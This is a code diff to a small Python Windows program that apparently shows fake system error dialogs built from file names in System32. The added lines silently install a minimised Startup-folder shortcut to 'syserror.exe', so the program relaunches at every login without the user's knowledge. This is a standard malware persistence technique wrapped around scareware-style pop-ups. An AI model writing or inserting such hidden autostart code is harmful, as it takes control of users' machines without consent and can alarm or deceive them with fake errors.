@@ -1,8 +1,21 @@
 from tkinter import Tk, messagebox
 import random
-from os import scandir
+import getpass
+USERNAME = getpass.getuser()
+import os
 from time import sleep
-x = scandir('C:\\Windows\\System32')
+import win32com.client
+if os.path.isfile('C:\\Users\\'+USERNAME+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\0.lnk') == False:
+    pathto = 'C:\\Users\\'+USERNAME+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
+    pathtos = pathto+'\\0.lnk'
+    target = os.getcwd()+'\\syserror.exe'
+    shell = win32com.client.Dispatch("WScript.Shell")
+    shortcut = shell.CreateShortCut(pathtos)
+    shortcut.Targetpath = target
+    
+    shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
+    shortcut.save()
+x = os.scandir('C:\\Windows\\System32')
 y = []
 for entry in x:
     if entry.is_file():
